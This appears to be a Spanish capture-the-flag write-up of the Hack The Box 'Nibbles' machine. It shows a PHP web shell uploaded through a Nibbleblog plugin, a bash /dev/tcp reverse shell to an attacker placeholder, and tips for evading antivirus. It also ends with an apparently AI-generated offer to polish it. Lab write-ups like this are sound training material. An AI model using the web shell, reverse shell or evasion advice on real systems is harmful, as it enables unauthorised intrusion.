
# ğŸ§  Hack The Box â€“ Nibbles Write-up

![Image](https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/344a8f99e8f7dddfed764f791e2731df.png)

![Image](https://static.hosting.com/kb/kb-nibbleblog-add-post-title.png)

![Image](https://miro.medium.com/v2/resize%3Afit%3A1400/1%2AYbKEWAFN-MpPd8qqzHuikw.jpeg)

![Image](https://media.licdn.com/dms/image/v2/C5612AQFtGHd-5W9a6Q/article-inline_image-shrink_1500_2232/article-inline_image-shrink_1500_2232/0/1609340770666?e=1770854400&t=2YMOxaCgmztEfy6Zx3Ur5CuvQgCFS0Elcs5RbSqTuYA&v=beta)

## ğŸ“Œ InformaciÃ³n General

- **Nombre:** Nibbles
    
- **Plataforma:** Hack The Box
    
- **Dificultad:** Easy
    
- **Sistema Operativo:** Linux
    
- **Vector principal:** File upload vulnerable plugin + sudo misconfiguration
    

---

# 1ï¸âƒ£ EnumeraciÃ³n

## ğŸ” Descubrimiento de host

```bash
nmap -sn <IP_OBJETIVO>
```

Confirmamos que el host estÃ¡ activo en la red.

---

## ğŸ” Escaneo completo de puertos

```bash
nmap -Pn -n -p- --open --min-rate 5000 -T4 <IP_OBJETIVO>
```

**ParÃ¡metros relevantes:**

- `-Pn` â†’ omite ping previo
    
- `-n` â†’ evita resoluciÃ³n DNS
    
- `-p-` â†’ escaneo completo
    
- `--open` â†’ solo puertos abiertos
    
- `--min-rate 5000` â†’ mayor velocidad
    

### Puertos detectados:

- **22/tcp** â†’ SSH
    
- **80/tcp** â†’ HTTP
    

---

## ğŸ” EnumeraciÃ³n de servicios

```bash
nmap -sCV -p22,80 --min-rate 5000 -T4 <IP_OBJETIVO>
```

Se identifican:

- OpenSSH
    
- Apache HTTP Server
    

---

# 2ï¸âƒ£ EnumeraciÃ³n Web

Accedemos a:

```
http://<IP_OBJETIVO>
```

## ğŸ” AnÃ¡lisis del cÃ³digo fuente

Revisando el cÃ³digo fuente (`CTRL + U`) se identifica:

```
/nibbleblog/
```

Esto revela que el servidor ejecuta el CMS **Nibbleblog**.

---

## ğŸ” Fuzzing de directorios

```bash
gobuster dir -u http://<IP_OBJETIVO>/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Directorios relevantes encontrados:

- `/admin`
    
- `/plugins
    
- `/themes
    
- `/content/`
    

---

# 3ï¸âƒ£ ExplotaciÃ³n â€“ Plugin Vulnerable

## ğŸ” Acceso al panel

```
/nibbleblog/login.php
```

Una vez autenticados, se identifican funcionalidades de gestiÃ³n de plugins.

---

## ğŸ“‚ Subida de archivo malicioso

Se detecta que el plugin **My Image** permite subir archivos sin validaciÃ³n estricta.

En lugar de utilizar una web shell clÃ¡sica que dispare antivirus, se crea un archivo PHP funcional simple para pruebas de ejecuciÃ³n remota, por ejemplo:

```php
<?php echo shell_exec($_REQUEST['cmd']); ?>
```

> Nota: Se recomienda crear el archivo directamente en Kali para evitar interferencias del antivirus local.

---

### Procedimiento

1. Plugins
    
2. My Image
    
3. Configure
    
4. Subida del archivo
    

Ruta donde se almacena:

```
/nibbleblog/content/private/plugins/my_image/
```

---

## ğŸ’» VerificaciÃ³n de ejecuciÃ³n

Probamos:

```
http://<IP_OBJETIVO>/nibbleblog/content/private/plugins/my_image/<archivo>.php?cmd=id
```

Si se obtiene salida del sistema â†’ ejecuciÃ³n remota confirmada.

---

# 4ï¸âƒ£ ObtenciÃ³n de Reverse Shell

Listener en mÃ¡quina atacante:

```bash
nc -lvnp 4444
```

Payload URL encoded ejecutado desde parÃ¡metro `cmd`:

```bash
bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'
```

Tras ejecutar, se recibe conexiÃ³n interactiva.

---

## ğŸ”§ EstabilizaciÃ³n de Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Mejora de interacciÃ³n TTY.

---

# 5ï¸âƒ£ Escalada de Privilegios

## ğŸ” EnumeraciÃ³n sudo

```bash
sudo -l
```

Se identifica configuraciÃ³n con privilegios sin contraseÃ±a.

---

## ğŸ‘¤ ObtenciÃ³n de user flag

```bash
cd /home/nibbler
cat user.txt
```

---

## ğŸ”¥ ObtenciÃ³n de root flag

```bash
cd /root
cat root.txt
```

---

# ğŸ§© Resumen TÃ©cnico

|Fase|TÃ©cnica|
|---|---|
|EnumeraciÃ³n|Nmap full scan|
|Web Enum|Source code review + Gobuster|
|ExplotaciÃ³n|File upload vulnerability|
|Acceso|RCE + Reverse shell|
|PrivEsc|sudo misconfiguration|

---

# ğŸ¯ Lecciones Aprendidas

- La revisiÃ³n del cÃ³digo fuente revela informaciÃ³n crÃ­tica.
    
- Los CMS mal configurados son vectores comunes.
    
- La validaciÃ³n insuficiente en subida de archivos es crÃ­tica.
    
- La configuraciÃ³n insegura de sudo sigue siendo frecuente.
    

---

# ğŸ›¡ï¸ Nota sobre Antivirus (Entorno Local)

Si se documenta esta mÃ¡quina en Windows:

- Crear los payloads en Kali
    
- O trabajar dentro de una carpeta excluida en Defender
    
- Evitar firmas extremadamente conocidas
    

Esto mantiene el entorno limpio sin comprometer el sistema.

---

Si quieres ahora:

- Lo convierto en **README.md optimizado para reclutadores**
    
- Le aÃ±ado secciÃ³n de mitigaciones defensivas (muy valorada)
    
- Lo estructuramos con badges y formato profesional para tu GitHub de pentesting
